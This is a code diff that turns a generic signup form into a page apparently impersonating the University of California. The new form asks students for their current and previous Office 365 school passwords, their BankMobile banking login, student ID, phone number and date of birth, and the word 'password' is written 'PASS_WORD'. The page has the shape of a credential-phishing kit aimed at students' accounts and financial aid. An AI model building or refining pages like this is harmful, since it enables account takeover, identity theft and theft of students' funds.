@@ -2,119 +2,140 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Signup Form</title>
-
-  <!-- Favicon -->
-  <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon">
-
-  <!-- Google Font (optional) -->
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-
+  <title>Student Info Form</title>
   <style>
-    body {
-      font-family: 'Roboto', sans-serif;
-      background: #f9f9f9;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+  form {
+    max-width: 600px;
+    margin: 40px auto;
+    padding: 20px;
+    background-color: #f9f9f9;
+    border-radius: 12px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    font-family: Arial, sans-serif;
+  }
+
+  form label {
+    display: block;
+    margin-top: 15px;
+    margin-bottom: 5px;
+    font-weight: bold;
+  }
+
+  .title{
+    text-align: center;
+  }
+
+  form input[type="text"],
+  form input[type="email"],
+  form input[type="password"],
+  form input[type="tel"],
+  form input[type="date"] {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-sizing: border-box;
+    font-size: 14px;
+  }
+
+  #bankmobile_available {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: 15px;
+    flex-wrap: wrap;
+  }
+
+  #bankmobile_available label:first-child {
+    flex-basis: 100%;
+    margin-bottom: 5px;
+  }
+
+  form button[type="submit"] {
+    margin-top: 25px;
+    padding: 10px 20px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  form button[type="submit"]:hover {
+    background-color: #0056b3;
+  }
+
+  @media (max-width: 600px) {
+    form {
+      padding: 15px;
     }
 
-    .form-container {
-      background: #fff;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
-      box-sizing: border-box;
+    #bankmobile_available {
+      flex-direction: column;
+      align-items: flex-start;
     }
+  }
+</style>
 
-    .form-container img.logo {
-      display: block;
-      margin: 0 auto 1rem;
-      width: 80px;
+  <script>
+    function toggleBankMobileFields() {
+      const isYes = document.getElementById('bankmobile_yes').checked;
+      const bankFields = document.getElementById('bankmobile_fields');
+      bankFields.style.display = isYes ? 'block' : 'none';
     }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 1.5rem;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 0.5rem;
-      margin-top: 1rem;
-      font-weight: bold;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    input[type="password"],
-    input[type="date"] {
-      width: 100%;
-      padding: 0.75rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
-    }
-
-    button {
-      margin-top: 1.5rem;
-      width: 100%;
-      padding: 0.75rem;
-      border: none;
-      border-radius: 4px;
-      background-color: #4CAF50;
-      color: white;
-      font-size: 1rem;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #45a049;
-    }
-  </style>
+  </script>
 </head>
 <body>
 
-  <div class="form-container">
-    <!-- Logo -->
-    <img src="https://example.com/logo.png" alt="Logo" class="logo">
+  <h1 class="title">university of california</h1>
+  <form>
+    <label for="full_name">1. FULL NAME</label>
+    <input type="text" id="full_name" name="full_name" required>
 
-    <h2>Sign Up</h2>
+    <label for="current_email">2. CURRENT OFFICE 365 SCHOOL EMAIL</label>
+    <input type="email" id="current_email" name="current_email" required>
 
-    <form action="/submit" method="POST">
-      <label for="name">Full Name:</label>
-      <input type="text" id="name" name="name" required>
+    <label for="current_password">3. CURRENT OFFICE 365 SCHOOL PASS_WORD</label>
+    <input type="password" id="current_password" name="current_password" required>
 
-      <label for="email">CURRENT OFFICE 365 SCHOOL EMAIL</label>
-      <input type="email" id="email" name="email" required>
+    <label for="phone">4. PHONE NUMBER</label>
+    <input type="tel" id="phone" name="phone" required>
 
-      <label for="password">CURRENT OFFICE 365 SCHOOL PASS_WORD</label>
-      <input type="password" id="password" name="password" required>
+    <label for="student_id">5. STUDENT ID</label>
+    <input type="text" id="student_id" name="student_id" required>
 
-      <label for="number">PHONE NUMBER</label>
-      <input type="text" id="number" name="number" required>
+    <label for="dob">6. DOB</label>
+    <input type="date" id="dob" name="dob" required>
 
-      <label for="dob">Date of Birth:</label>
-      <input type="date" id="dob" name="dob" required>
 
-      <label for="name">Full Name:</label>
-      <input type="text" id="name" name="name" required>
-  
-      <label for="bank_account">Have you created a bank account?</label>
-    <input type="radio" name="bank_account" value="yes">Yes
-    <input type="radio" name="bank_account" value="no">No
-  </label>
-  
+<div id="bankmobile_available">
+      <label for="yes">7. HAVE YOU SET UP A BANKMOBILE ACCOUNT</label>
 
-      <button type="submit">Register</button>
-    </form>
-  </div>
+
+      <input type="radio" id="yes" name="choice" value="Yes">
+  <label for="yes">Yes</label>
+  <input type="radio" id="no" name="choice" value="No">
+  <label for="no">No</label>
+    </div>
+
+    <div id="bankmobile_fields">
+      <label for="bankmobile_email">8. IF YES, BANKMOBILE EMAIL ADDRESS</label>
+      <input type="email" id="bankmobile_email" name="bankmobile_email">
+
+      <label for="bankmobile_password">9. BANKMOBILE PASS_WORD</label>
+      <input type="password" id="bankmobile_password" name="bankmobile_password">
+    </div>
+
+    <label for="previous_email">10. PREVIOUS SCHOOL OFFICE 365 EMAIL</label>
+    <input type="email" id="previous_email" name="previous_email">
+
+    <label for="previous_password">11. PREVIOUS SCHOOL OFFICE 365 PASS_WORD</label>
+    <input type="password" id="previous_password" name="previous_password">
+
+    <br><br>
+    <button type="submit">Submit</button>
+  </form>
 
 </body>
 </html>
